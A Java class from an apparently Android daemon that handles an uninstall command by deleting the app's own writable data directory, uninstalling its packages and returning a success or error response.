package com.fx.maind.commands;

import java.io.File;
import java.io.IOException;
import java.util.ArrayList;

import com.daemon_bridge.CommandResponseBase;
import com.daemon_bridge.SendUninstallCommand;
import com.daemon_bridge.SendUninstallCommandResponse;
import com.fx.maind.ServiceManager;
import com.vvt.daemon.appengine.AppEngine;
import com.vvt.ioutil.FileUtil;
import com.vvt.logger.FxLog;

public class UninstallCommandProcess {
	private final static String TAG = "UninstallCommandProcess";

	public static CommandResponseBase execute(AppEngine appEngine,
			SendUninstallCommand sendUninstallCommand) {
		FxLog.v(TAG, "execute # ENTER ...");
		SendUninstallCommandResponse commandResponse = null;
		try {
			
			// delete all file.
			if(appEngine != null) {
				if(appEngine.getWritablePath() != null) {
				File file = new File(appEngine.getWritablePath());
					if (file.exists()) {
						FxLog.v(TAG, "processCommand # delete all file");
						try {
							FileUtil.deleteAllFile(file, new ArrayList<String>());
						} catch (IOException e) {
						}
					}
				}
			}
			// Uninstall ..
			String packageName = SendPackageNameCommandProcess.getPackageName(appEngine.getWritablePath());
			ServiceManager.getInstance().uninstallAll(packageName);
			commandResponse = new SendUninstallCommandResponse(CommandResponseBase.SUCCESS);
		} catch (Throwable t) {
			FxLog.e(TAG, t.toString());
			commandResponse = new SendUninstallCommandResponse(CommandResponseBase.ERROR);
		}

		FxLog.v(TAG, "execute # EXIT ...");
		return commandResponse;
	}

}
